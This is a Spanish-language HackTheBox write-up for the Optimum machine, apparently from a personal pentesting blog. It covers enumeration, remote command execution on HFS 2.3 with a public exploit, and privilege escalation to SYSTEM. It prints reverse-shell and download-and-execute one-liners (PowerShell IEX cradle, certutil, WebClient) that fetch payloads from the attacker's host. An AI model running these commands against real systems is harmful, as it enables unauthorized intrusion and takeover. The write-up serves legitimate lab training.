---
layout: single
title: HackTheBox - Máquina Optimum
excerpt: "Solución de la máquina Optimum de Hack the Box."
date: 2021-05-03
classes: wide
header:
  teaser: /assets/images/htb/optimum/optimum.png
  teaser_home_page: true
tags:
  - Htb
  - Pentesting
  - Windows
  - Easy
---

<p align="center">
<img src="/assets/images/htb/optimum/optimum.png">
</p>

# Enumeración

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.10.8 -oG allPorts
```

```bash
nmap -sC -sV -p80 10.10.10.8 -oN targeted
```

En el escaneo más especifico solo vemos un puerto abierto:

```text
80/tcp open  http    HttpFileServer httpd 2.3
```

*Whatweb:*
```bash
whatweb http://10.10.10.8

http://10.10.10.8 [200 OK] Cookies[HFS_SID], Country[RESERVED][ZZ], HTTPServer[HFS 2.3], HttpFileServer, IP[10.10.10.8], JQuery[1.4.4], Script[text/javascript], Title[HFS /]
```

# Explotación

Vamos a buscar alguna vulnerabilidad en searchsploit del HttpFileServer 2.3.

```bash
searchsploit HFS 2.3
```

```text
--------------------------------------------------------------------------------------------------------------------------------------------------------- 
 Exploit Title                                                                                 |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------- 
HFS (HTTP File Server) 2.3.x - Remote Command Execution (3)                                    | windows/remote/49584.py
HFS Http File Server 2.3m Build 300 - Buffer Overflow (PoC)                                    | multiple/remote/48569.py
Rejetto HTTP File Server (HFS) 2.2/2.3 - Arbitrary File Upload                                 | multiple/remote/30850.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (1)                            | windows/remote/34668.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)                            | windows/remote/39161.py
Rejetto HTTP File Server (HFS) 2.3a/2.3b/2.3c - Remote Command Execution                       | windows/webapps/34852.txt
--------------------------------------------------------------------------------------------------------------------------------------------------------- 

```

Por lo que vamos a usar el script `39161.py`, estando en el directorio `exploits` lo copiamos mediante `searchsploit -m 39161`. 

Para ello en el script nos dice que tenemos que tener compartido el ejecutable de netcat, por ello hacemos un `locate nc.exe` y copiamos `/usr/share/windows-resources/binaries/nc.exe` a nuestro directorio `content`. Levantamos un servidor `python3 -m http.server 80` (Necesitamos permisos de root)

Editamos el script para añadir nuestra ip y nuestro puerto local, ejecutamos la primera vez el exploit `python2.7 39161.py 10.10.10.8 80` para hacer uso del netcat y la segunda vez nos creara la reverse shell, para ellos previamente nos ponemos a la escucha en el puerto que hayamos puesto en el script y finalmente ya estamos dentro de la máquina con el usuario `optimum\kostas`.

# Escalada de Privilegios

Una vez que estamos dentro de la máquina nos vamos a pasar a una powershell para ello vamos a usar [Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1), editamos el script para añadir al final la siguiente línea:

```bash
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.XX.XX -Port 4444
```

Nos ponemos en escucha por el puerto 4444 y desde la máquina víctima ejecutamos:

```bash
start /b C:\Windows\SysNative\WindowsPowerShell\v1.0\powershell.exe IEX(New-Object Net.WebClient).downloadString('http://10.10.14.17:8000/IP.ps1')
```

Con lo que obtenemos una powershell, para saber si estamos en una máquina de x64 bits y el proceso corresponde a la arquitectura lanzamos:

```bash
[environment]::Is64BitOperatingSystem
[environment]::Is64BitProcess
```

Y el resultado será:

```bash
[environment]::Is64BitOperatingSystem
True
[environment]::Is64BitProcess
True
PS C:\Users\kostas\Desktop> 
```

Para la escalada de privilegios usamos [Windows Exploit Suggester](https://github.com/bitsadmin/wesng) para utilizarlo necesitamos obtener la información del sistema mediante `systeminfo`, lo copiamos y lo guardamos en el directorio content.

Para obtener los máximos privilegios vamos a utilizar [MS16-098](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS16-098/bfill.exe), nos los descargamos en la máquina local y lo compartimos mediante un servidor en python.

Para descargarlo en la máquina víctima usamos alguna de estas formas:

```bash
certutil.exe -f -urlcache -split http://10.10.XX.XX:8000/bfill.exe bfill.exe

powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.XX.XX:8000/bfill.exe', 'C:\Users\kostas\Desktop\bfill.exe')"

powershell Invoke-WebRequest "http://10.10.XX.X:8000/bfill.exe" -OutFile "C:\Users\kostas\Desktop\bfill.exe"
```

Al ejecutarlo tenemos permisos de `NT AUTHORITY\SYSTEM` y ya se puede ver la flag de root.